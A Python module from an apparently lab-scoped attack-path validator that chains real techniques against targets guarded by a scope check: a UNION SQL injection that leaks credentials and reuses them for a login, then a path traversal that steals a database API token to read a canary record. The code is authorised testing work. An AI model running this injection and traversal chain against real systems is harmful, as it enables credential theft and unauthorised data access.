"""Validator: proves planned attack steps with harmless evidence.

Each check is keyed by the edge's `check` id and performs the *real*
technique against the target — but every payload is a canary: the SQL
injection only reads a synthetic users table, the traversal only reads
a canary token file, the database only ever returns canary records.
Nothing destructive exists in this module, by construction.

Scope discipline: before a check sends a single byte, EVERY host it
will touch is passed through Scope.authorize(). Out-of-scope raises
ScopeViolation and the check never runs.

Proof levels: CONFIRMED (canary evidence captured), LIKELY (observed
posture, e.g. reachability), FAILED (the step did not work).
"""

from __future__ import annotations

import json
import re
import urllib.request
from urllib.parse import urlparse

from .lab import CROWN_CANARY
from .scope import Scope


def _host_of(url: str) -> str:
    return urlparse(url).hostname or ""


class Context:
    """Per-campaign state: scope, loot (capabilities won en route)."""

    def __init__(self, scope: Scope, timeout: float = 5.0):
        self.scope = scope
        self.timeout = timeout
        self.loot: dict = {}

    def authorize_url(self, url: str) -> None:
        self.scope.authorize(_host_of(url))

    def http(self, url: str, data: bytes | None = None,
             headers: dict | None = None) -> tuple[int, str, dict]:
        self.authorize_url(url)  # choke point — before any byte is sent
        req = urllib.request.Request(url, data=data, headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.status, resp.read().decode(errors="replace"), dict(resp.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace"), dict(e.headers or {})
        except urllib.error.URLError as e:
            return 0, f"connection failed: {e.reason}", {}


def _evidence(step: dict, proof: str, detail: str, artifact: str = "") -> dict:
    return {"step": step["n"], "check": step.get("check"),
            "from": step["from"], "to": step["to"],
            "technique": step["technique"], "proof": proof,
            "detail": detail, "artifact": artifact[:240]}


def _mask(text: str, secrets: list[str]) -> str:
    for s in secrets:
        if s:
            text = text.replace(s, "••••••")
    return text


# -- checks ---------------------------------------------------------------------

def check_http_reach(ctx: Context, step: dict) -> dict:
    target = step["params"]["target"]
    code, body, _ = ctx.http(target + "/")
    if code == 200:
        return _evidence(step, "LIKELY",
                         f"{target} responds — service is reachable",
                         body.strip())
    return _evidence(step, "FAILED", f"{target} returned HTTP {code}")


def check_sqli_reuse(ctx: Context, step: dict) -> dict:
    via, target = step["params"]["via"], step["params"]["target"]
    payload = "-1 UNION SELECT username,password FROM users--"
    code, body, _ = ctx.http(f"{via}/product?id={urllib.parse.quote(payload)}")
    m = re.search(r"(svc_backup) \| (\S+)", body)
    if not m:
        return _evidence(step, "FAILED",
                         "SQL injection did not leak service credentials",
                         body.strip())
    user, password = m.group(1), m.group(2)
    ctx.loot["creds:svc"] = (user, password)
    data = json.dumps({"username": user, "password": password}).encode()
    code, body, headers = ctx.http(target + "/login", data=data,
                                   headers={"Content-Type": "application/json"})
    cookie = headers.get("Set-Cookie", "")
    if code != 200 or "session=" not in cookie:
        return _evidence(step, "FAILED",
                         "leaked credentials were rejected by filesrv",
                         f"login HTTP {code}")
    ctx.loot["session:filesrv"] = cookie.split(";")[0]
    return _evidence(step, "CONFIRMED",
                     "SQLi leaked svc_backup credentials and the same "
                     "password opened a filesrv session (credential reuse)",
                     _mask(f"leaked row: {user} | {password}; login HTTP 200",
                           [password]))


def check_traversal_token(ctx: Context, step: dict) -> dict:
    via, target = step["params"]["via"], step["params"]["target"]
    cookie = ctx.loot.get("session:filesrv")
    if not cookie:
        return _evidence(step, "FAILED", "no filesrv session in loot")
    code, body, _ = ctx.http(
        f"{via}/download?name=../vault/db_token.txt",
        headers={"Cookie": cookie})
    m = re.search(r"DB_API_TOKEN=(\S+)", body)
    if code != 200 or not m:
        return _evidence(step, "FAILED",
                         "path traversal did not return the db token",
                         body.strip())
    token = m.group(1)
    ctx.loot["token:db"] = token
    code, body, _ = ctx.http(target + "/record",
                             headers={"Authorization": f"Bearer {token}"})
    if code == 200 and CROWN_CANARY in body:
        ctx.loot["crown"] = CROWN_CANARY
        return _evidence(step, "CONFIRMED",
                         "traversal stole the payments API token and the "
                         "token read the crown-jewel canary record",
                         _mask(body.strip(), [token]))
    return _evidence(step, "FAILED",
                     f"crown record not read (HTTP {code})", body.strip())


CHECKS = {
    "http-reach": check_http_reach,
    "sqli+reuse": check_sqli_reuse,
    "traversal+token": check_traversal_token,
}
